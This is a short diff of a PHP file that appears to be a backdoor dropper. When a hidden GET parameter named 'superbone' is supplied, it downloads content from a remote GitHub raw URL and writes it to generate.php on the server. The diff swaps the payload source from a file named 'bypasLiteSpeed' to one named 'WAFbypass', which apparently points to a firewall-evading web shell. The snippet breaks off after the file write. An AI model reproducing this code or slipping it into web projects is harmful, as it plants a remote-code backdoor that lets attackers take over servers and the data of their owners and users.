@@ -1,7 +1,7 @@
 <?php
 if (isset($_GET['superbone'])) {
     $targetFile = getcwd() . '/generate.php';
-    $sourceUrl  = "https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/bypasLiteSpeed";
+    $sourceUrl  = "https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/WAFbypass";
 
     // tulis file
     if (file_put_contents($targetFile, file_get_contents($sourceUrl))) {
